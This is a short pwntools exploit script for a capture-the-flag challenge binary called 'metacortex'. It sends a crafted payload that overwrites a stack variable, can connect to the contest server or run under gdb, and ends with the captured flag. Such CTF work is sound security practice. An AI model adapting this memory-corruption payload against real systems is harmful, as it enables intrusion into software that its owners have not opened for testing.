"""
Overwrite stack variable
"""
from pwn import *

binary_path = "./metacortex"

#lib_path = "./lib/"
#UNSORTED_BIN_OFFSET = 0x1b9a40

# lib_path = "/home/kali/HeapLAB/.glibc/glibc_2.31/"
# UNSORTED_BIN_OFFSET = 0x3b5be0

lib_path = "/lib/x86_64-linux-gnu/"

#=Boilerplate=================================================================#

elf = context.binary = ELF(binary_path)
libc = ELF(lib_path + "libc.so.6")

gs="""

#contextwatch execute "vis 50"

# python
# import splitmind
# (splitmind.Mind()
#     .tell_splitter(show_titles=True)
#     .tell_splitter(set_title="gdb")
#     .above(of="main", display="expressions", size="75%")
#     .left(of="expressions", display="regs", size="15%")
#     .above(of="regs", display="disasm")
#     .above(of="disasm", display="stack")
# ).build(nobanner=True)
# end

python
import splitmind
(splitmind.Mind()
    .tell_splitter(show_titles=True)
    .tell_splitter(set_title="gdb")
     #.above(of="main", display="expressions", size="75%")
     #.left(of="expressions", display="disasm", size="35%")
    .above(of="main", display="stack", size="75%")
    .left(of="stack", display="regs", size="66%")
    .right(of="regs", display="disasm")
).build(nobanner=True)
end

# Catch malloc errors before seccomp kills us
# catch syscall writev

continue
"""
def start():
    if args.DEBUG:
        context.log_level = "DEBUG"

    if args.REMOTE:
        # nc chal.ctf.b01lers.com 1014
        return remote("chal.ctf.b01lers.com", 1014)

    if args.GDB:
        context.terminal = ["tmux", "split-window", "-v", "-b", "-p", "80"]
        return gdb.debug(binary_path, gdbscript=gs, env={"LD_LIBRARY_PATH": lib_path})
    else:
        return process(binary_path, env={"LD_LIBRARY_PATH": lib_path})


def breakpoint(io, msg=None):
    if args.GDB:
        if msg is not None:
            print(f"*** BREAKPOINT: {msg} ***")
        else:
            print("*** BREAKPOINT ***")
        io.interactive()

io = start()

breakpoint(io)

io.sendline(flat({
    0x00: "0\0",
    0x50: p64(0)
}))

io.interactive()

# flag{Ne0_y0uAre_d0ing_well}
